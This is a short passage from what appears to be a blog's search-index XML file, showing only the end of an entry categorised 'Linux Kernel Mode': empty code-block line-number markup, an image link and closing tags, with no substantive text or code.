class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Binary_FILE/77c08f8025a05cc5889087ab9e9031bb_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux Kernel Mode </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
